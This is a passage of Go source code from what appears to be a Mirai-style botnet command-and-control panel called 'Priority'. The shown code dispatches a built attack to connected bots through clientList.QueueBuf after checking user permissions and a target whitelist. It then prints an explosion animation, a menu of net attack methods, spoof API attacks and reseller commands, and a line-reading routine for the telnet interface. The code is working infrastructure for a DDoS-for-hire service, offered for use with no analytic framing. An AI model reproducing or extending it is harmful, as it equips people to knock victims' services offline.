			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					data, err := ioutil.ReadFile("msg")
					if err != nil {
						return
					}
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  |\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |/ \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                  / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                  | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                   |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                   |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                   |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                   / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                   | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                       |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                       |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                       |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                        |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                    | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                       |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     / **/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     | == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |  | \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |  / \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                       |/  \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     |/**/|\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     / == /\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                      |  | \033[0m\r\n"))
					time.Sleep(200 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                  .-=||  | |=-.       \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;96m                                  `-=#$%&%$#=-'       \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     | ;  :|          \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                            _____.,-#%&$@%#&#~,._____ \033[0m\r\n"))
					time.Sleep(300 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;96m                                _.-^^---....,,--      \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                            _--                  --_  \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                           <                        >)\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                           |                         |\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                            /._                   _./ \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;96m                               ```--. . , ; .--'''    \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     | |   |          \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                  .-=||  | |=-.       \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;96m                                  `-=#$%&%$#=-'       \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                                     | ;  :|          \033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                            _____.,-#%&$@%#&#~,._____ \033[0m\r\n"))
					time.Sleep(2000 * time.Millisecond)
					this.conn.Write([]byte("\033[2J\033[1H"))
					this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
					this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ╔═══╚══════════════════\033[00;1;96m══════════════════╝═══╗\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mATTACK\033[00;1;95m - SHOWS NET AT\033[00;1;96mTACK MENUS            ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mAPI\033[00;1;95m - SHOWS SPOOF API\033[00;1;96m ATTACK METHODS       ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mFUNC\033[00;1;95m - SHOWS THE NET \033[00;1;96mFUNCTIONS             ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mTOOLS\033[00;1;95m - SHOWS THE NET\033[00;1;96m LOOKUP TOOLS         ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mSTATS\033[00;1;95m - SHOWS THE NET\033[00;1;96m'S STATUS             ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mACCOUNT\033[00;1;95m - SHOWS ACCOU\033[00;1;96mNT SETTINGS           ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mRULES\033[00;1;95m - SHOWS THE NET\033[00;1;96mS TERMS OF SERVICE    ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mBANNERS\033[00;1;95m - SHOWS THE N\033[00;1;96mET BANNERS            ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mEXTHELP\033[00;1;95m - MESSAGE A A\033[00;1;96mDMIN FOR EXTRA HELP   ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mRESELLER\033[00;1;95m - LISTS RESE\033[00;1;96mLLER COMMANDS         ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mEXIT\033[00;1;95m - CLOSE YOUR TER\033[00;1;96mMINAL                 ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mCLEAR\033[00;1;95m - CLEARS YOUR T\033[00;1;96mERMINAL               ║\033[0m\r\n"))
					this.conn.Write([]byte("\033[00;1;95m                 ╚══════════════════════\033[00;1;96m══════════════════════╝\033[0m\r\n"))
					this.conn.Write([]byte(fmt.Sprintf("\033[0m                 ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
					this.conn.Write([]byte("                                \033[00;1;96m║═══\033[00;1;95mPRIORITY\033[00;1;96m═══║\033[0m\r\n"))
					this.conn.Write([]byte("                                \033[00;1;96m║══\033[00;1;95m⮞\033[00;92m ATTACK SENT!\033[0m\r\n"))
				} else {
					fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
				}
			}
		}
	}
}

/*--------------------------------------------------------------------------------------------------------------------------------------------*/

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1000)
	bufPos := 0
	for {
		if len(buf) < bufPos+2 {
			fmt.Println("\033[0mOver Exceded Buf:", len(buf))
			fmt.Println("\033[0mPrevented CNC Crash | IP:", this.conn.RemoteAddr())
			return string(buf), nil
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\033[0m\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("\033[00;1;95mPriority 💔\033[0m\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("\033[00;1;95mx\033[0m"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
